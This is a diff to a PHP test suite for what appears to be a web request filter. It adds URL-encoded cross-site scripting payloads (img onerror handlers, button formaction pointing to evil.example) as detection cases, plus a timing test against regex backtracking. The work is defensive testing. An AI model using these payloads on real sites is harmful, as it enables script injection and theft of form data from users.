@@ -101,6 +101,11 @@ return [
             ['/?q=%3Cimg%20title%3D%22%3E%22%20src%3Dx%20onerror%3Dalert(1)%3E', [], 'ATK-XSS-EVENT'],   // a ">" in a quoted value does not end the tag
             ["/?q=%3Cimg%20title%3D'%3E'%20onerror%3Dalert(1)%3E", [], 'ATK-XSS-EVENT'],
             ['/?q=%3Cimg%20src%3Dx%20a%22%20onerror%3Dalert(1)%3E', [], 'ATK-XSS-EVENT'],             // a quote in a name opens no value
+            ['/?q=%3Cimg%20src%3D%3D%22%20onerror%3Dalert(1)//%3E', [], 'ATK-XSS-EVENT'],            // src==" : an unquoted value '="', then onerror
+            ['/?q=%3Cimg%20src%3Dx%20%3D%22x%20onerror%3Dalert(1)//%3E', [], 'ATK-XSS-EVENT'],      // a name that starts with =
+            ['/?q=%3Cimg%20src%3Dx%20title%3D%22x%22%3D%22y%20onerror%3Dalert(1)//%3E', [], 'ATK-XSS-EVENT'],
+            ['/?q=%3Cimg%20title%3D%22%3E%22%20alt%3D%22%3E%22%20onerror%3Dx%3E', [], 'ATK-XSS-EVENT'],   // two quoted ">"
+            ['/?q=%3Cbutton%20x%3D%3D%22%20formaction%3D//evil.example/%3E', [], 'ATK-XSS-ATTR'],
             ['/?q=%3Cbutton%20formaction%3Dhttps://evil.example/steal%3Ex', [], 'ATK-XSS-ATTR'],     // a button that sends the form elsewhere
             ['/?q=%3Cinput%20type%3Dsubmit%20formaction%3D//evil.example/%3E', [], 'ATK-XSS-ATTR'],
             ['/?q=%3Csvg%3E%3Ca%20xlink:href%3D%22javascript:alert(1)%22%3E%3Ctext%3Ex', [], 'ATK-XSS-ATTR'],   // SVG's link
@@ -249,7 +254,6 @@ return [
             '/?q=x%20%3C%20y%20formaction%3D1',      // "x < y": no tag
             '/?q=formaction%3Dsave',                 // the word without a tag
             '/?q=%3Cb%3Eformaction%3D%3C/b%3E',      // the tag closed before it
-            '/?q=%3Cimg%20title%3D%22abc%20onerror%3Dx%3E',   // a value never closed: the handler is part of it
             '/?d=a:1:{i:0;s:1:"x";}',                // a serialised array: no object in it
             '/?t=10:30:00&o=1',                      // times, a parameter called o
             '/fetch?url=https://www.example.org/feed',   // an ordinary address
@@ -424,5 +428,26 @@ return [
         truthy($own >= 12, 'the attack patterns were read');
         // Including it twice is once.
         same($s->contentRules, attacksRules("include @attacks\n")->contentRules, 'twice is once');
+    },
+    'RSF02-06 attacks: a query full of tags costs about what a plain one of the same length costs -- no pattern scans to the end from every "<"' => function (): void {
+        $s = attacksRules();
+        $shield = new Shield($s, new MemoryStore());
+        $time = static function (string $q) use ($shield): float {
+            $r = attacksRequest('/?q=' . $q);
+            $best = INF;
+            for ($i = 0; $i < 5; $i++) {
+                $t = hrtime(true);
+                for ($j = 0; $j < 10; $j++) {
+                    $shield->decide(attacksRequest('/?q=' . $q), 1000.0);
+                }
+                $best = min($best, hrtime(true) - $t);
+            }
+            return (float) $best;
+        };
+        $plain = $time(substr(str_repeat('ax%20', 900), 0, 3800));
+        foreach (['%3Ca%3Dx%20', '%3Ca%3D%22', '%3Ca%20x%3D%22y%22%20', '%3Ca%3D'] as $unit) {
+            $hostile = $time(substr(str_repeat($unit, 900), 0, 3800));
+            truthy($hostile < 20 * $plain, 'a query of "' . rawurldecode($unit) . '" repeated: ' . round($hostile / $plain, 1) . ' times a plain one');
+        }
     },
 ];
